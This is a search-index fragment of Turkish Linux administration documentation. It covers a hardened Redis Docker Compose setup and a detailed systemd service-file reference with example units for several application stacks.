g\u00fcvenli ve kal\u0131c\u0131 (persistent) hale getiriyoruz.</p>"},{"location":"file-templates/redis/#klasor-yaps","title":"\ud83c\udfd7\ufe0f Klas\u00f6r Yap\u0131s\u0131","text":"<pre><code>redis/\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 .env\n\u251c\u2500\u2500 configs/\n\u2502   \u2514\u2500\u2500 redis.conf\n\u2514\u2500\u2500 data/                 # Verilerin tutulaca\u011f\u0131 yer\n</code></pre>"},{"location":"file-templates/redis/#1-docker-compose-dosyas","title":"\ud83d\udc33 1. Docker Compose Dosyas\u0131","text":"<p><code>docker-compose.yml</code> i\u00e7eri\u011fi:</p> <pre><code>version: \"3.8\"\n\nservices:\n  redis:\n    image: redis:7-alpine\n    container_name: production_redis\n    restart: always\n    # Config dosyas\u0131n\u0131 y\u00fcklemek i\u00e7in explicit komut:\n    command: redis-server /usr/local/etc/redis/redis.conf\n    ports:\n      - \"127.0.0.1:6379:6379\" # SADECE localhost'a a\u00e7!\n    volumes:\n      - ./data:/data\n      - ./configs/redis.conf:/usr/local/etc/redis/redis.conf\n\n    # --- G\u00dcVENL\u0130K (HARDENING) ---\n    # Container yetkilerini minimuma indiriyoruz\n    cap_drop:\n      - ALL\n    cap_add:\n      - CHOWN\n      - SETGID\n      - SETUID\n      - DAC_OVERRIDE\n\n    # --- KAYNAKLAR ---\n    mem_limit: 1g\n    cpus: 1.0\n\n    sysctls:\n      # Redis performans ayar\u0131\n      net.core.somaxconn: 1024\n\n    healthcheck:\n      test:\n        [\n          \"CMD\",\n          \"redis-cli\",\n          \"-a\",\n          \"CokGucluBirRedisSifresiBelirleyin_!23\",\n          \"ping\",\n        ]\n      interval: 10s\n      timeout: 5s\n      retries: 3\n</code></pre>"},{"location":"file-templates/redis/#2-konfigurasyon-redisconf","title":"\u2699\ufe0f 2. Konfig\u00fcrasyon (<code>redis.conf</code>)","text":"<p><code>configs/redis.conf</code> dosyas\u0131 olu\u015fturun. <code>command</code> sat\u0131r\u0131 sayesinde Redis bu dosyay\u0131 okuyacakt\u0131r.</p>"},{"location":"file-templates/redis/#a-guvenlik-ayarlar","title":"A. G\u00fcvenlik Ayarlar\u0131 \ud83d\udee1\ufe0f","text":"<pre><code># --- A\u011e ---\nbind 0.0.0.0      # Docker i\u00e7inde (D\u0131\u015far\u0131ya Compose ile kapatt\u0131k)\nprotected-mode yes\n\n# --- \u015e\u0130FRELEME ---\nrequirepass \"CokGucluBirRedisSifresiBelirleyin_!23\"\n# Not: ACL (Access Control List) kullanmak isterseniz \"user\" tan\u0131mlar\u0131 yapabilirsiniz.\n\n# --- TEHL\u0130KEL\u0130 KOMUTLARI KAPATMA ---\n# Sald\u0131rgan\u0131n sunucuyu silmesini engelle\nrename-command FLUSHDB \"\"\nrename-command FLUSHALL \"\"\nrename-command CONFIG \"\"\nrename-command DEBUG \"\"\n</code></pre>"},{"location":"file-templates/redis/#b-kalclk-persistence","title":"B. Kal\u0131c\u0131l\u0131k (Persistence) \ud83d\udcbe","text":"<p>Veri kayb\u0131n\u0131 \u00f6nlemek i\u00e7in hem RDB (Snapshot) hem AOF (Log) a\u00e7\u0131yoruz.</p> <pre><code># --- RDB (Snapshot) ---\nsave 900 1\nsave 300 10\nsave 60 10000\ndbfilename dump.rdb\ndir /data\n\n# --- AOF (Append Only File) ---\nappendonly yes\nappendfilename \"appendonly.aof\"\nappendfsync everysec\n</code></pre>"},{"location":"file-templates/redis/#c-bellek-yonetimi","title":"C. Bellek Y\u00f6netimi \ud83e\udde0","text":"<pre><code># RAM s\u0131n\u0131r\u0131na gelince hata ver (eviction yapma)\nmaxmemory 768mb\nmaxmemory-policy noeviction\n</code></pre>"},{"location":"file-templates/redis/#3-baslatma","title":"\ud83d\ude80 3. Ba\u015flatma","text":"<pre><code>docker compose up -d\n</code></pre>"},{"location":"file-templates/redis/#test-etme","title":"Test Etme","text":"<pre><code># \u015eifreli Ping\ndocker exec -it production_redis redis-cli -a \"CokGucluBirRedisSifresiBelirleyin_!23\" ping\n# PONG\n</code></pre> <p>[!TIP] &gt; Neden <code>command</code> kulland\u0131k? Varsay\u0131lan Redis imaj\u0131, config dosyas\u0131 olmadan ba\u015flar. Biz <code>command: redis-server /path/to/conf</code> diyerek \"benim ayarlar\u0131m\u0131 kullan\" demi\u015f olduk.</p>"},{"location":"file-templates/systemd/","title":"Systemd Service Template (Production Ready) \u2699\ufe0f","text":"<p>Systemd, modern Linux da\u011f\u0131t\u0131mlar\u0131nda servisleri y\u00f6neten ana sistemdir. Bu rehber, production-grade systemd service dosyalar\u0131 olu\u015fturman\u0131z i\u00e7in gereken her \u015feyi i\u00e7erir.</p>"},{"location":"file-templates/systemd/#icindekiler","title":"\ud83d\udccb \u0130\u00e7indekiler","text":"<ol> <li>Temel Yap\u0131</li> <li>Unit Section</li> <li>Service Section</li> <li>Install Section</li> <li>Geli\u015fmi\u015f \u00d6rnekler</li> <li>Troubleshooting</li> </ol>"},{"location":"file-templates/systemd/#temel-yapi","title":"\ud83c\udfd7\ufe0f Temel Yap\u0131","text":"<pre><code>[Unit]\nDescription=My Awesome Node.js App\nDocumentation=https://example.com\nAfter=network.target\n\n[Service]\nUser=deployer\nGroup=deployer\nEnvironment=NODE_ENV=production\nEnvironment=PORT=3000\nWorkingDirectory=/home/deployer/app\nExecStart=/usr/bin/node /home/deployer/app/server.js\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"file-templates/systemd/#hzl-baslangc-komutlar","title":"H\u0131zl\u0131 Ba\u015flang\u0131\u00e7 Komutlar\u0131","text":"<pre><code># Dosyay\u0131 olu\u015ftur\nsudo nano /etc/systemd/system/myapp.service\n\n# Systemd'yi yeniden y\u00fckle\nsudo systemctl daemon-reload\n\n# Servisi aktif et ve ba\u015flat\nsudo systemctl enable --now myapp\n\n# Durum kontrol\u00fc\nsudo systemctl status myapp\n</code></pre>"},{"location":"file-templates/systemd/#unit-section","title":"\ud83d\udce6 Unit Section","text":""},{"location":"file-templates/systemd/#temel-direktifler","title":"Temel Direktifler","text":"<pre><code>[Unit]\n# Servis a\u00e7\u0131klamas\u0131 (systemctl status'da g\u00f6r\u00fcn\u00fcr)\nDescription=My Awesome Node.js App\n\n# Dok\u00fcmantasyon linkleri\nDocumentation=https://example.com\nDocumentation=man:myapp(8)\n\n# Bu servisler ba\u015flad\u0131ktan SONRA ba\u015fla\nAfter=network.target postgresql.service redis.service\n\n# Bu servisler ba\u015flamadan \u00d6NCE ba\u015fla\nBefore=nginx.service\n\n# Zorunlu ba\u011f\u0131ml\u0131l\u0131klar (bunlar ba\u015far\u0131s\u0131z olursa bu da ba\u015flamaz)\nRequires=postgresql.service\n\n# Opsiyonel ba\u011f\u0131ml\u0131l\u0131klar (bunlar ba\u015far\u0131s\u0131z olsa da ba\u015flar)\nWants=redis.service\n\n# \u00c7ak\u0131\u015fan servisler (ayn\u0131 anda \u00e7al\u0131\u015famaz)\nConflicts=apache2.service\n\n# Servis ko\u015fulu (dosya varsa ba\u015fla)\nConditionPathExists=/home/deployer/app/server.js\n\n# Servis ko\u015fulu (dizin varsa ba\u015fla)\nConditionDirectoryNotEmpty=/home/deployer/app\n</code></pre>"},{"location":"file-templates/systemd/#dependency-ornekleri","title":"Dependency \u00d6rnekleri","text":"<p>Veritaban\u0131 gerektiren uygulama:</p> <pre><code>[Unit]\nDescription=Backend API Server\nAfter=network.target postgresql.service\nRequires=postgresql.service\nWants=redis.service\n</code></pre> <p>A\u011f servisi bekleyen uygulama:</p> <pre><code>[Unit]\nDescription=Web Application\nAfter=network-online.target\nWants=network-online.target\n</code></pre>"},{"location":"file-templates/systemd/#service-section","title":"\u2699\ufe0f Service Section","text":""},{"location":"file-templates/systemd/#type-direktifi","title":"Type Direktifi","text":"<pre><code>[Service]\n# simple (varsay\u0131lan): ExecStart hemen ba\u015flar\nType=simple\n\n# forking: Daemon gibi fork yapan uygulamalar i\u00e7in\nType=forking\nPIDFile=/var/run/myapp.pid\n\n# oneshot: Bir kez \u00e7al\u0131\u015f\u0131p biten scriptler i\u00e7in\nType=oneshot\nRemainAfterExit=yes\n\n# notify: Haz\u0131r oldu\u011funda systemd'ye sinyal g\u00f6nderen uygulamalar\nType=notify\n\n# exec: ExecStart binary'si \u00e7al\u0131\u015ft\u0131r\u0131ld\u0131\u011f\u0131nda ba\u015far\u0131l\u0131 say\u0131l\u0131r\nType=exec\n</code></pre>"},{"location":"file-templates/systemd/#kullanc-ve-grup","title":"Kullan\u0131c\u0131 ve Grup","text":"<pre><code>[Service]\n# \u00c7al\u0131\u015ft\u0131racak kullan\u0131c\u0131\nUser=deployer\nGroup=deployer\n\n# Dinamik kullan\u0131c\u0131 (ge\u00e7ici, izole)\nDynamicUser=yes\n\n# Ek gruplar\nSupplementaryGroups=docker ssl-cert\n</code></pre>"},{"location":"file-templates/systemd/#cevresel-degiskenler","title":"\u00c7evresel De\u011fi\u015fkenler","text":"<pre><code>[Service]\n# Tek tek tan\u0131mlama\nEnvironment=NODE_ENV=production\nEnvironment=PORT=3000\nEnvironment=DB_HOST=localhost\n\n# Dosyadan okuma\nEnvironmentFile=/etc/myapp/environment\nEnvironmentFile=-/etc/myapp/environment.local  # \"-\" = opsiyonel\n\n# T\u00fcm environment'\u0131 temizle\nUnsetEnvironment=HOME\n</code></pre> <p>Environment dosyas\u0131 \u00f6rne\u011fi (<code>/etc/myapp/environment</code>):</p> <pre><code>NODE_ENV=production\nPORT=3000\nDB_HOST=localhost\nDB_PORT=5432\nDB_NAME=myapp\nDB_USER=myapp_user\nDB_PASS=supersecret\nJWT_SECRET=my-jwt-secret\n</code></pre>"},{"location":"file-templates/systemd/#calsma-dizini-ve-komutlar","title":"\u00c7al\u0131\u015fma Dizini ve Komutlar","text":"<pre><code>[Service]\n# \u00c7al\u0131\u015fma dizini\nWorkingDirectory=/home/deployer/app\n\n# Ana komut\nExecStart=/usr/bin/node server.js\n\n# Ba\u015flamadan \u00f6nce \u00e7al\u0131\u015facak komutlar\nExecStartPre=/usr/bin/npm install\nExecStartPre=/bin/mkdir -p /var/log/myapp\n\n# Ba\u015flad\u0131ktan sonra \u00e7al\u0131\u015facak komutlar\nExecStartPost=/bin/echo \"Service started\" &gt;&gt; /var/log/myapp/events.log\n\n# Yeniden y\u00fckleme komutu (SIGHUP yerine)\nExecReload=/bin/kill -HUP $MAINPID\n\n# Durma komutu (\u00f6zel graceful shutdown)\nExecStop=/usr/bin/node /home/deployer/app/scripts/shutdown.js\n\n# Durduktan sonra temizlik\nExecStopPost=/bin/rm -f /var/run/myapp.pid\n</code></pre>"},{"location":"file-templates/systemd/#restart-politikalar","title":"Restart Politikalar\u0131","text":"<pre><code>[Service]\n# Restart se\u00e7enekleri:\n# no          : Asla restart etme\n# always      : Her zaman restart et\n# on-success  : Sadece ba\u015far\u0131l\u0131 \u00e7\u0131k\u0131\u015fta (exit code 0)\n# on-failure  : Sadece ba\u015far\u0131s\u0131z \u00e7\u0131k\u0131\u015fta\n# on-abnormal : Sinyal veya timeout durumunda\n# on-abort    : Yakalanmam\u0131\u015f sinyal durumunda\n# on-watchdog : Watchdog timeout durumunda\n\nRestart=on-failure\n\n# Restart \u00f6ncesi bekleme s\u00fcresi\nRestartSec=10\n\n# Maksimum restart denemesi (30 saniye i\u00e7inde 5 deneme)\nStartLimitBurst=5\nStartLimitIntervalSec=30\n\n# Ba\u015far\u0131l\u0131 say\u0131lmas\u0131 i\u00e7in gereken \u00e7al\u0131\u015fma s\u00fcresi\nRestartPreventExitStatus=0\nSuccessExitStatus=143\n</code></pre>"},{"location":"file-templates/systemd/#timeout-ayarlar","title":"Timeout Ayarlar\u0131","text":"<pre><code>[Service]\n# Ba\u015flama timeout'u\nTimeoutStartSec=90\n\n# Durma timeout'u\nTimeoutStopSec=30\n\n# Her ikisi i\u00e7in\nTimeoutSec=60\n\n# Watchdog (uygulama periyodik sinyal g\u00f6ndermeli)\nWatchdogSec=30\n</code></pre>"},{"location":"file-templates/systemd/#kaynak-limitleri","title":"Kaynak Limitleri","text":"<pre><code>[Service]\n# CPU limiti (%100 = 1 core)\nCPUQuota=200%\n\n# Memory limiti\nMemoryMax=512M\nMemoryHigh=400M\n\n# Dosya limitleri\nLimitNOFILE=65535\nLimitNPROC=4096\n\n# Nice de\u011feri (-20 ile 19 aras\u0131)\nNice=-5\n\n# I/O \u00f6nceli\u011fi\nIOSchedulingClass=best-effort\nIOSchedulingPriority=4\n</code></pre>"},{"location":"file-templates/systemd/#guvenlik-ayarlar","title":"G\u00fcvenlik Ayarlar\u0131","text":"<pre><code>[Service]\n# Filesystem korumas\u0131\nProtectSystem=strict          # /usr, /boot, /efi read-only\nProtectHome=read-only         # /home, /root, /run/user read-only\nPrivateTmp=yes                # \u0130zole /tmp\n\n# Sadece bu dizinlere yazabilir\nReadWritePaths=/var/lib/myapp /var/log/myapp\n\n# Network korumas\u0131\nPrivateNetwork=no             # yes = a\u011f eri\u015fimi yok\nRestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX\n\n# Kernel korumas\u0131\nProtectKernelTunables=yes\nProtectKernelModules=yes\nProtectControlGroups=yes\n\n# Capability k\u0131s\u0131tlamas\u0131\nCapabilityBoundingSet=CAP_NET_BIND_SERVICE\nAmbientCapabilities=CAP_NET_BIND_SERVICE\n\n# Syscall filtreleme\nSystemCallFilter=@system-service\nSystemCallFilter=~@privileged @resources\n\n# Di\u011fer g\u00fcvenlik\nNoNewPrivileges=yes\nPrivateDevices=yes\nProtectClock=yes\nProtectHostname=yes\n</code></pre>"},{"location":"file-templates/systemd/#logging","title":"Logging","text":"<pre><code>[Service]\n# Stdout/Stderr y\u00f6nlendirmesi\nStandardOutput=journal\nStandardError=journal\n\n# Veya dosyaya\nStandardOutput=append:/var/log/myapp/stdout.log\nStandardError=append:/var/log/myapp/stderr.log\n\n# Syslog identifier\nSyslogIdentifier=myapp\n\n# Log seviyesi\nSyslogLevel=info\n</code></pre>"},{"location":"file-templates/systemd/#install-section","title":"\ud83d\udce5 Install Section","text":"<pre><code>[Install]\n# Multi-user seviyesinde ba\u015flat (genellikle bu kullan\u0131l\u0131r)\nWantedBy=multi-user.target\n\n# Grafik aray\u00fcz\u00fc ile ba\u015flat\nWantedBy=graphical.target\n\n# Alias tan\u0131mla\nAlias=mywebapp.service\n\n# Bu servis enable edilince bunlar\u0131 da enable et\nAlso=myapp-worker.service myapp-scheduler.service\n</code></pre>"},{"location":"file-templates/systemd/#gelismis-ornekler","title":"\ud83d\ude80 Geli\u015fmi\u015f \u00d6rnekler","text":""},{"location":"file-templates/systemd/#1-production-nodejs-uygulamas","title":"1. Production Node.js Uygulamas\u0131","text":"<pre><code>[Unit]\nDescription=Production Node.js API Server\nDocumentation=https://docs.myapp.com\nAfter=network-online.target postgresql.service redis.service\nWants=network-online.target\nRequires=postgresql.service\nWants=redis.service\n\n[Service]\nType=simple\nUser=nodeapp\nGroup=nodeapp\n\n# Environment\nEnvironment=NODE_ENV=production\nEnvironmentFile=/etc/myapp/production.env\nEnvironmentFile=-/etc/myapp/secrets.env\n\n# \u00c7al\u0131\u015fma\nWorkingDirectory=/opt/myapp\nExecStartPre=/usr/bin/npm run db:migrate\nExecStart=/usr/bin/node --max-old-space-size=4096 dist/server.js\nExecReload=/bin/kill -USR2 $MAINPID\n\n# Restart\nRestart=always\nRestartSec=10\nStartLimitBurst=5\nStartLimitIntervalSec=60\n\n# Timeouts\nTimeoutStartSec=120\nTimeoutStopSec=30\n\n# Kaynaklar\nMemoryMax=4G\nCPUQuota=300%\nLimitNOFILE=65535\n\n# G\u00fcvenlik\nNoNewPrivileges=yes\nPrivateTmp=yes\nProtectSystem=strict\nProtectHome=yes\nReadWritePaths=/opt/myapp/uploads /var/log/myapp\n\n# Logging\nStandardOutput=journal\nStandardError=journal\nSyslogIdentifier=myapp-api\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"file-templates/systemd/#2-python-djangogunicorn-uygulamas","title":"2. Python Django/Gunicorn Uygulamas\u0131","text":"<pre><code>[Unit]\nDescription=Django Application with Gunicorn\nAfter=network.target postgresql.service\n\n[Service]\nType=notify\nUser=django\nGroup=www-data\n\nWorkingDirectory=/var/www/mydjango\nEnvironment=DJANGO_SETTINGS_MODULE=myproject.settings.production\nEnvironmentFile=/etc/mydjango/env\n\nExecStart=/var/www/mydjango/venv/bin/gunicorn \\\n    --workers 4 \\\n    --worker-class uvicorn.workers.UvicornWorker \\\n    --bind unix:/run/mydjango/gunicorn.sock \\\n    --access-logfile /var/log/mydjango/access.log \\\n    --error-logfile /var/log/mydjango/error.log \\\n    --capture-output \\\n    myproject.asgi:application\n\nExecReload=/bin/kill -s HUP $MAINPID\n\nRestart=on-failure\nRestartSec=5\nKillMode=mixed\nTimeoutStopSec=30\n\nPrivateTmp=yes\nProtectSystem=strict\nReadWritePaths=/var/www/mydjango/media /var/log/mydjango /run/mydjango\n\n[Install]\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"file-templates/systemd/#3-net-core-aspnet-uygulamas","title":"3. .NET Core / ASP.NET Uygulamas\u0131","text":"<pre><code>[Unit]\nDescription=ASP.NET Core Web API\nAfter=network.target\n\n[Service]\nType=notify\nUser=dotnet\nGroup=dotnet\n\nWorkingDirectory=/opt/myapp\nEnvironmentFile=/etc/myapp/appsettings.env\n\n# Kestrel web server\nExecStart=/usr/bin/dotnet /opt/myapp/MyApp.dll\n\n# Graceful shutdown\nExecStop=/bin/kill -SIGTERM $MAINPID\nKillSignal=SIGTERM\nTimeoutStopSec=30\n\n# .NET i\u00e7in \u00f6zel ayarlar\nEnvironment=DOTNET_PRINT_TELEMETRY_MESSAGE=false\nEnvironment=ASPNETCORE_ENVIRONMENT=Production\nEnvironment=ASPNETCORE_URLS=http://localhost:5000\n\nRestart=on-failure\nRestartSec=10\nTimeoutStartSec=90\n\n# Memory limiti (.NET i\u00e7in)\nMemoryMax=1G\nEnvironment=DOTNET_GCHeapHardLimit=0x40000000\n\n# G\u00fcvenlik\nNoNewPrivileges=yes\nPrivateTmp=yes\nProtectSystem=strict\nProtectHome=yes\nReadWritePaths=/var/log/myapp\n\n# Logging\nStandardOutput=journal\nStandardError=journal\nSyslogIdentifier=myapp-dotnet\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"file-templates/systemd/#4-php-fpm-uygulamas-laravelsymfony","title":"4. PHP-FPM Uygulamas\u0131 (Laravel/Symfony)","text":"<pre><code>[Unit]\nDescription=Laravel Application (PHP-FPM)\nAfter=network.target php8.2-fpm.service mysql.service\nRequires=php8.2-fpm.service\n\n[Service]\nType=oneshot\nRemainAfterExit=yes\nUser=www-data\nGroup=www-data\n\nWorkingDirectory=/var/www/laravel\nEnvironmentFile=/var/www/laravel/.env\n\n# Laravel i\u00e7in gerekli izinler\nExecStartPre=/bin/chown -R www-data:www-data /var/www/laravel/storage\nExecStartPre=/bin/chown -R www-data:www-data /var/www/laravel/bootstrap/cache\n\n# Cache temizleme ve optimize etme\nExecStart=/usr/bin/php /var/www/laravel/artisan config:cache\nExecStart=/usr/bin/php /var/www/laravel/artisan route:cache\nExecStart=/usr/bin/php /var/www/laravel/artisan view:cache\n\n# Queue worker i\u00e7in ayr\u0131 servis gerekir (laravel-queue.service)\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>Laravel Queue Worker (<code>laravel-queue.service</code>):</p> <pre><code>[Unit]\nDescription=Laravel Queue Worker\nAfter=network.target mysql.service redis.service\n\n[Service]\nType=simple\nUser=www-data\nGroup=www-data\n\nWorkingDirectory=/var/www/laravel\nEnvironmentFile=/var/www/laravel/.env\n\nExecStart=/usr/bin/php /var/www/laravel/artisan queue:work \\\n    --sleep=3 \\\n    --tries=3 \\\n    --max-time=3600 \\\n    --queue=default,emails,notifications\n\nRestart=always\nRestartSec=10\n\n# Memory leak \u00f6nleme\nExecReload=/bin/kill -USR1 $MAINPID\nTimeoutStopSec=60\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"file-templates/systemd/#5-reactvueangular-production-build-serve","title":"5. React/Vue/Angular (Production Build Serve)","text":"<p>Option A: serve paketi ile:</p> <pre><code>[Unit]\nDescription=React Production App (serve)\nAfter=network.target\n\n[Service]\nType=simple\nUser=webapp\nGroup=webapp\n\nWorkingDirectory=/var/www/react-app\nEnvironment=NODE_ENV=production\nEnvironment=PORT=3000\n\n# serve paketi ile static dosyalar\u0131 servis et\nExecStart=/usr/bin/npx serve -s build -l 3000\n\nRestart=always\nRestartSec=5\n\n# G\u00fcvenlik\nNoNewPrivileges=yes\nPrivateTmp=yes\nProtectSystem=strict\nReadWritePaths=/var/log/react-app\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>Option B: http-server ile:</p> <pre><code>[Unit]\nDescription=React App with http-server\nAfter=network.target\n\n[Service]\nType=simple\nUser=webapp\nGroup=webapp\n\nWorkingDirectory=/var/www/react-app/build\n\nExecStart=/usr/bin/npx http-server \\\n    -p 3000 \\\n    -c-1 \\\n    --gzip \\\n    --cors\n\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>[!TIP] &gt; Production'da React/Vue/Angular i\u00e7in en iyi y\u00f6ntem: Systemd ile serve etmek yerine Nginx ile static dosyalar\u0131 servis edin. \u00c7ok daha h\u0131zl\u0131 ve g\u00fcvenlidir:</p> <pre><code>server {\n    listen 80;\n    server_name myapp.com;\n    root /var/www/react-app/build;\n    index index.html;\n    location / {\n        try_files $uri $uri/ /index.html;\n    }\n}\n</code></pre>"},{"location":"file-templates/systemd/#6-go-binary-uygulamas","title":"6. Go Binary Uygulamas\u0131","text":"<pre><code>[Unit]\nDescription=Go Microservice\nAfter=network.target\n\n[Service]\nType=exec\nUser=goapp\nGroup=goapp\n\nEnvironmentFile=/etc/goapp/config.env\n\nExecStart=/opt/goapp/bin/myservice\nRestart=always\nRestartSec=5\n\n# Go uygulamalar\u0131 i\u00e7in memory limiti\nMemoryMax=256M\nEnvironment=GOMEMLIMIT=200MiB\n\n# G\u00fcvenlik (Go binary i\u00e7in s\u0131k\u0131 k\u0131s\u0131tlamalar)\nNoNewPrivileges=yes\nPrivateTmp=yes\nPrivateDevices=yes\nProtectSystem=strict\nProtectHome=yes\nProtectKernelTunables=yes\nProtectKernelModules=yes\nProtectControlGroups=yes\nRestrictNamespaces=yes\nRestrictRealtime=yes\nRestrictSUIDSGID=yes\nSystemCallFilter=@system-service\nSystemCallErrorNumber=EPERM\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"file-templates/systemd/#4-java-spring-boot-uygulamas","title":"4. Java Spring Boot Uygulamas\u0131","text":"<pre><code>[Unit]\nDescription=Spring Boot Application\nAfter=network.target\n\n[Service]\nType=simple\nUser=spring\nGroup=spring\n\nWorkingDirectory=/opt/springapp\nEnvironmentFile=/etc/springapp/application.env\n\nExecStart=/usr/bin/java \\\n    -Xms512m \\\n    -Xmx2g \\\n    -XX:+UseG1GC \\\n    -XX:MaxGCPauseMillis=200 \\\n    -Djava.security.egd=file:/dev/./urandom \\\n    -Dspring.profiles.active=production \\\n    -jar /opt/springapp/app.jar\n\nExecStop=/bin/kill -TERM $MAINPID\nSuccessExitStatus=143\n\nRestart=on-failure\nRestartSec=15\nTimeoutStartSec=180\nTimeoutStopSec=30\n\nMemoryMax=2500M\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"file-templates/systemd/#5-workerbackground-job-servisi","title":"5. Worker/Background Job Servisi","text":"<pre><code>[Unit]\nDescription=Background Job Worker\nAfter=network.target redis.service\nRequires=redis.service\nPartOf=myapp.service\n\n[Service]\nType=simple\nUser=worker\nGroup=worker\n\nWorkingDirectory=/opt/myapp\nEnvironmentFile=/etc/myapp/worker.env\n\nExecStart=/opt/myapp/venv/bin/celery \\\n    -A myapp worker \\\n    --loglevel=info \\\n    --concurrency=4 \\\n    --queues=default,emails,reports\n\n# Graceful shutdown i\u00e7in\nExecStop=/bin/kill -TERM $MAINPID\nKillSignal=SIGTERM\nTimeoutStopSec=60\n\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"file-templates/systemd/#6-scheduled-task-timer-ile","title":"6. Scheduled Task (Timer ile)","text":"<p>Service dosyas\u0131 (<code>/etc/systemd/system/backup.service</code>):</p> <pre><code>[Unit]\nDescription=Daily Database Backup\n\n[Service]\nType=oneshot\nUser=backup\nGroup=backup\n\nExecStart=/opt/scripts/backup.sh\nStandardOutput=journal\nStandardError=journal\n\n# Oneshot i\u00e7in gerekirse\nRemainAfterExit=no\n</code></pre> <p>Timer dosyas\u0131 (<code>/etc/systemd/system/backup.timer</code>):</p> <pre><code>[Unit]\nDescription=Run backup daily at 2 AM\n\n[Timer]\nOnCalendar=*-*-* 02:00:00\nPersistent=true\nRandomizedDelaySec=300\n\n[Install]\nWantedBy=timers.target\n</code></pre> <p>Kullan\u0131m:</p> <pre><code>sudo systemctl enable --now backup.timer\nsudo systemctl list-timers\n</code></pre>"},{"location":"file-templates/systemd/#7-socket-activation","title":"7. Socket Activation","text":"<p>Socket dosyas\u0131 (<code>/etc/systemd/system/myapp.socket</code>):</p> <pre><code>[Unit]\nDescription=MyApp Socket\n\n[Socket]\nListenStream=8080\nAccept=no\nReusePort=yes\n\n[Install]\nWantedBy=sockets.target\n</code></pre> <p>Service dosyas\u0131 (<code>/etc/systemd/system/myapp.service</code>):</p> <pre><code>[Unit]\nDescription=MyApp Service\nRequires=myapp.socket\nAfter=myapp.socket\n\n[Service]\nType=simple\nUser=myapp\n\nExecStart=/opt/myapp/bin/server\nStandardInput=socket\nStandardOutput=journal\nStandardError=journal\n\nNonBlocking=yes\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>"},{"location":"file-templates/systemd/#8-template-service-birden-fazla-instance","title":"8. Template Service (Birden Fazla Instance)","text":"<p>Template dosyas\u0131 (<code>/etc/systemd/system/myapp@.service</code>):</p> <pre><code>[Unit]\nDescription=MyApp Instance %i\nAfter=network.target\n\n[Service]\nType=simple\nUser=myapp\nGroup=myapp\n\nEnvironment=INSTANCE=%i\nEnvironmentFile=/etc/myapp/%i.env\n\nWorkingDirectory=/opt/myapp\nExecStart=/opt/myapp/bin/server --port=%i\n\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>Kullan\u0131m:</p> <pre><code># Port 3001'de instance ba\u015flat\nsudo systemctl enable --now myapp@3001\n\n# Port 3002'de instance ba\u015flat\nsudo systemctl enable --now myapp@3002\n\n# T\u00fcm instance'lar\u0131 listele\nsudo systemctl list-units 'myapp@*'\n</code></pre>"},{"location":"file-templates/systemd/#troubleshooting","title":"\ud83d\udd27 Troubleshooting","text":""},{"location":"file-templates/systemd/#sk-kullanlan-komutlar","title":"S\u0131k Kullan\u0131lan Komutlar","text":"<pre><code># Servis durumu\nsudo systemctl status myapp\n\n# T\u00fcm loglar\u0131 g\u00f6r\u00fcnt\u00fcle\nsudo journalctl -u myapp\n\n# Son 100 sat\u0131r log\nsudo journalctl -u myapp -n 100\n\n# Canl\u0131 log takibi\nsudo journalctl -u myapp -f\n\n# Belirli zaman aral\u0131\u011f\u0131\nsudo journalctl -u myapp --since \"2024-01-01\" --until \"2024-01-02\"\n\n# Sadece hatalar\nsudo journalctl -u myapp -p err\n\n# Servis dosyas\u0131n\u0131 kontrol et\nsudo systemd-analyze verify /etc/systemd/system/myapp.service\n\n# Servis ba\u011f\u0131ml\u0131l\u0131klar\u0131n\u0131 g\u00f6ster\nsudo systemctl list-dependencies myapp\n\n# Servis \u00f6zelliklerini g\u00f6ster\nsudo systemctl show myapp\n\n# Failed servisleri listele\nsudo systemctl list-units --state=failed\n\n# Servisi resetle (restart limiti a\u015f\u0131ld\u0131ysa)\nsudo systemctl reset-failed myapp\n</code></pre>"},{"location":"file-templates/systemd/#yaygn-hatalar-ve-cozumleri","title":"Yayg\u0131n Hatalar ve \u00c7\u00f6z\u00fcmleri","text":"Hata Kodu Sebep \u00c7\u00f6z\u00fcm 203/EXEC ExecStart yolu yanl\u0131\u015f Binary yolunu kontrol et 217/USER Kullan\u0131c\u0131 yok <code>useradd</code> ile kullan\u0131c\u0131 olu\u015ftur 226/NAMESPACE Namespace hatas\u0131 G\u00fcvenlik ayarlar\u0131n\u0131 gev\u015fet 200/CHDIR WorkingDirectory yok Dizini olu\u015ftur Start limit hit \u00c7ok fazla restart <code>reset-failed</code> ve sorunu \u00e7\u00f6z"},{"location":"file-templates/systemd/#debug-mode","title":"Debug Mode","text":"<pre><code>[Service]\n# Ekstra debug bilgisi i\u00e7in\nEnvironment=DEBUG=*\nEnvironment=NODE_DEBUG=*\n\n# Veya systemd debug\nStandardOutput=journal+console\nStandardError=journal+console\n</code></pre>"},{"location":"file-templates/systemd/#referanslar","title":"\ud83d\udcda Referanslar","text":"<ul> <li>systemd.service Manual</li> <li>systemd.exec Manual</li> <li>systemd.unit Manual</li> </ul>"},{"location":"how-to/","title":"Sistem Y\u00f6netimi - Kurulum &amp; Konfig\u00fcrasyon \u2699\ufe0f","text":"<p>Bu b\u00f6l\u00fcm, Linux sunucunuzu s\u0131f\u0131rdan production-ready hale getirmek i\u00e7in gereken ad\u0131m ad\u0131m kurulum rehberlerini i\u00e7erir.</p>"},{"location":"how-to/#bu-bolumde-neler-var","title":"\ud83c\udfaf Bu B\u00f6l\u00fcmde Neler Var?","text":""},{"location":"how-to/#temel-sistem","title":"\ud83d\udda5\ufe0f Temel Sistem","text":"<p>Sunucunuzun temelini olu\u015fturan core ayarlar:</p> <ul> 